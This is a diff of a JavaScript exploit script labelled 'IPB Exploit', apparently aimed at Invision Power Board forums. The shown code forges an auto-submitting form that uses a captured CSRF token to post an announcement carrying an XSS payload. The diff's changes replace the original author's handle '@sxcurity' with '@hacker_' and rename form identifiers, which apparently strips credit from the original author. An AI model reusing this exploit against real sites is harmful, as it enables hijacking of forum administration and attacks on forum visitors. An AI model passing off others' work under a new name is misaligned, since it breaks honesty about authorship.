@@ -5,7 +5,7 @@
 | | |_) \ V  V /| | | |
 |_| .__/ \_/\_/ |_| |_|
  |_|  IPB Exploit
-      by @sxcurity
+      by @hacker_
 */
 
 // specifies the target, the title of the announcement, and the xss payload!
@@ -37,16 +37,16 @@ var today = mm+'/'+dd+'/'+yyyy;
 
 // build form with valid token and evil credentials
 document.body.innerHTML
-  += '<form id="sxcurity" action="' + target + '" method="POST">'
+  += '<form id="cdl" action="' + target + '" method="POST">'
 	+ '<input type="hidden" name="_submitted" value="1">'
   + '<input type="hidden" name="csrfKey" value="' + token + '">'
 	+ '<input type="hidden" name="MAX_FILE_SIZE" value="2097152">'
-	+ '<input type="hidden" name="plupload" value="sxcurity">'
+	+ '<input type="hidden" name="plupload" value="cdl">'
 	+ '<input type="hidden" name="announce_title" value="' + title + '">'
 	+ '<input type="hidden" name="announce_start" value="' + today +'">'
 	+ '<input type="hidden" name="announce_end_unlimited" value="0">'
 	+ '<input type="hidden" name="announce_content" value="'+ payload +'">'
-	+ '<input type="hidden" name="announce_content_upload" value="sxcurity">'
+	+ '<input type="hidden" name="announce_content_upload" value="cdl">'
 	+ '<input type="hidden" name="announce_app_unlimited" value="*">'
 	+ '<input type="hidden" name="announce_calendars">'
 	+ '<input type="hidden" name="announce_calendars-zeroVal" value="on">'
@@ -57,7 +57,7 @@ document.body.innerHTML
   + '</form>';
 
 // submits our csrf form!
-document.forms["sxcurity"].submit();
+document.forms["cdl"].submit();
 
 function get(url) {
     var xmlHttp = new XMLHttpRequest();
